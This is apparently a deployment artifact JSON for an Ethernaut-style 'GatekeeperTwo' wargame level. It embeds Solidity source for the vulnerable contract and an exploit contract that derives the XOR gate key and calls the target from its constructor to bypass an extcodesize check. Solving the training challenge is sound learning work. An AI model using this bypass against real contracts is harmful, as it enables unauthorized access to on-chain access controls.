{
  "address": "0xE3324e1D9857BAE4B8693c81125E736c37037088",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_keeper",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    }
  ],
  "transactionHash": "0xf056464e06122728b406c732fcbb603c3c5a04d9513335ad743c63f637d45914",
  "receipt": {
    "to": null,
    "from": "0xd7Dd548772fF126999a1a02640beFA34C2ce470B",
    "contractAddress": "0xE3324e1D9857BAE4B8693c81125E736c37037088",
    "transactionIndex": 84,
    "gasUsed": "106441",
    "logsBloom": "0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
    "blockHash": "0xf6c60993eeeb46dfc56afe1fc295e5346cedfa1672b04ce3ff45ef3323021ca5",
    "transactionHash": "0xf056464e06122728b406c732fcbb603c3c5a04d9513335ad743c63f637d45914",
    "logs": [],
    "blockNumber": 8282857,
    "cumulativeGasUsed": "18261400",
    "status": 1,
    "byzantium": true
  },
  "args": [
    "0x46962124988285830678eC76823a29FcD16f5901"
  ],
  "numDeployments": 1,
  "solcInputHash": "9fb34e055566737cfbada12ac104648e",
  "metadata": "{\"compiler\":{\"version\":\"0.8.17+commit.8df45f5f\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_keeper\",\"type\":\"address\"}],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/GateKeeperTwo.sol\":\"GatekeeperTwoExploit\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\",\"useLiteralContent\":true},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/GateKeeperTwo.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\npragma solidity ^0.8.0;\\n\\ncontract GatekeeperTwo {\\n    address public entrant;\\n\\n    modifier gateOne() {\\n        require(msg.sender != tx.origin);\\n        _;\\n    }\\n\\n    modifier gateTwo() {\\n        uint x;\\n        assembly {\\n            x := extcodesize(caller())\\n        }\\n        require(x == 0);\\n        _;\\n    }\\n\\n    modifier gateThree(bytes8 _gateKey) {\\n        require(\\n            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) ==\\n                type(uint64).max\\n        );\\n        _;\\n    }\\n\\n    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\\n        entrant = tx.origin;\\n        return true;\\n    }\\n}\\n\\ncontract GatekeeperTwoExploit {\\n    GatekeeperTwo private immutable gatekeeper;\\n\\n    constructor(address _keeper) {\\n        gatekeeper = GatekeeperTwo(_keeper);\\n        // We want the following condition:\\n        //  uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) ==\\n        //         type(uint64).max\\n\\n        // type(uint64).max = uint64(0)-1 // this is overflow\\n        // we use communicative property of XOR\\n\\n        // a ^ b = c\\n        // a ^ a ^ b = a ^ c\\n        // a ^ a = 0 (XOR onto itself -> a ^ a)\\n        // 0 ^ b = b\\n        // b = a ^ c\\n        // answer is uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0)-1\\n        // gatekey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(0)-1)\\n\\n        bytes8 key;\\n        // since there is an overflow -> place it inside unchecked block\\n        unchecked {\\n            key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1));\\n        }\\n\\n        // since we are calling inside constructor -> codesize == 0, at this point, code is\\n        // not stored in the storage\\n        gatekeeper.enter(key);\\n    }\\n}\\n\",\"keccak256\":\"0x8c36a798a66ff01b4be9be3e90ca77e72bacc48bda083a64da6b5119aa9e6c84\",\"license\":\"MIT\"}},\"version\":1}",
  "bytecode": "0x60a060405234801561001057600080fd5b5060405161037638038061037683398181016040528101906100329190610186565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1681525050600060016000033060405160200161007e919061024b565b6040516020818303038152906040528051906020012060c01c1860c01b905060805173ffffffffffffffffffffffffffffffffffffffff16633370204e826040518263ffffffff1660e01b81526004016100d891906102a1565b6020604051808303816000875af11580156100f7573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061011b91906102f4565b505050610321565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061015382610128565b9050919050565b61016381610148565b811461016e57600080fd5b50565b6000815190506101808161015a565b92915050565b60006020828403121561019c5761019b610123565b5b60006101aa84828501610171565b91505092915050565b6000819050919050565b60006101d86101d36101ce84610128565b6101b3565b610128565b9050919050565b60006101ea826101bd565b9050919050565b60006101fc826101df565b9050919050565b60008160601b9050919050565b600061021b82610203565b9050919050565b600061022d82610210565b9050919050565b610245610240826101f1565b610222565b82525050565b60006102578284610234565b60148201915081905092915050565b60007fffffffffffffffff00000000000000000000000000000000000000000000000082169050919050565b61029b81610266565b82525050565b60006020820190506102b66000830184610292565b92915050565b60008115159050919050565b6102d1816102bc565b81146102dc57600080fd5b50565b6000815190506102ee816102c8565b92915050565b60006020828403121561030a57610309610123565b5b6000610318848285016102df565b91505092915050565b608051603f61033760003960005050603f6000f3fe6080604052600080fdfea2646970667358221220487cf2c5508bedfe923aaa0b9808327f0aae859e48bd71f27e7301debcd8adfb64736f6c63430008110033",
  "deployedBytecode": "0x6080604052600080fdfea2646970667358221220487cf2c5508bedfe923aaa0b9808327f0aae859e48bd71f27e7301debcd8adfb64736f6c63430008110033",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [],
    "types": null
  }
}